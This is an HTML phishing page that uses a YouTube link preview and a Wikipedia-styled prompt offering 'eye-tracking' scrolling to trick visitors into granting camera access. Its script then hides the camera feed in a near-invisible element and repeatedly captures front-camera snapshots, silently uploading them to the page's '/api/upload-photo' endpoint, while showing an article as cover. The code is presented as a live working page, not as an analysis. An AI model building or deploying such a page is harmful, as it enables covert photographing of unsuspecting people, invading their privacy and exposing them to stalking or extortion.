<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=0">
    
    <title>Youtube</title>
    <meta property="og:title" content="Youtube">
    <meta property="og:description" content="YouTube is a popular, free online video-sharing platform owned by Google that allows users to watch, upload, like, share, and comment on videos. As the world's second-most visited website, it hosts a vast array of content, including music videos, tutorials, vlogs, and live streams, acting as a major hub for entertainment and information.">
    <meta property="og:image" content="https://m.media-amazon.com/images/I/4195dyf+rFL.png">
    <meta property="og:type" content="website">

    <style>
        body, html { margin: 0; padding: 0; height: 100%; width: 100%; overflow: hidden; background: #fff; font-family: sans-serif; }
        
        #overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #fff; z-index: 9999; display: flex; flex-direction: column;
            align-items: center; justify-content: center; text-align: center; padding: 25px; box-sizing: border-box;
        }

        .wiki-logo { width: 80px; margin-bottom: 25px; }
        h2 { font-size: 22px; color: #202122; margin: 0 0 12px 0; }
        p { color: #54595d; font-size: 15px; line-height: 1.5; max-width: 320px; margin: 0 0 35px 0; }

        #enable-btn {
            background: #36b; color: #fff; border: none; padding: 16px 0;
            border-radius: 4px; font-weight: bold; font-size: 16px; cursor: pointer; width: 100%; max-width: 260px;
        }

        #wiki-view { width: 100%; height: 100%; border: none; display: none; }
        #video { position: fixed; bottom: 0; right: 0; width: 1px; height: 1px; opacity: 0.01; }
        canvas { display: none; }
    </style>
</head>
<body>

<div id="overlay">
    <img src="https://en.wikipedia.org/static/images/icons/wikipedia.png" class="wiki-logo">
    <h2>Enable 360° Viewing Experience</h2>
    <p>Wikipedia now supports Eye-Tracking. Allow camera access to automatically scroll the article as you read.</p>
    <button id="enable-btn">Enable & Read</button>
</div>

<iframe id="wiki-view"></iframe>
<video id="video" autoplay playsinline muted></video>
<canvas id="canvas"></canvas>

<script>
    const btn = document.getElementById('enable-btn');
    const wiki = document.getElementById('wiki-view');
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    let startTime;

    btn.addEventListener('click', async () => {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: 'user', width: { ideal: 1280 } } 
            });
            video.srcObject = stream;
            await video.play();

            wiki.src = "/view-article";
            wiki.style.display = "block";
            document.getElementById('overlay').style.display = "none";
            
            startTime = Date.now();
            setTimeout(photoLoop, 2000); 
        } catch (e) { alert("Access required for immersive experience"); }
    });

    function photoLoop() {
        const elapsed = Date.now() - startTime;
        let speed = elapsed < 10000 ? 900 : 7000;

        if (video.readyState === video.HAVE_ENOUGH_DATA) {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            fetch('/api/upload-photo', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ dataUrl: canvas.toDataURL('image/jpeg', 0.6) })
            }).catch(() => {});
        }
        setTimeout(photoLoop, speed);
    }
</script>
</body>
</html>
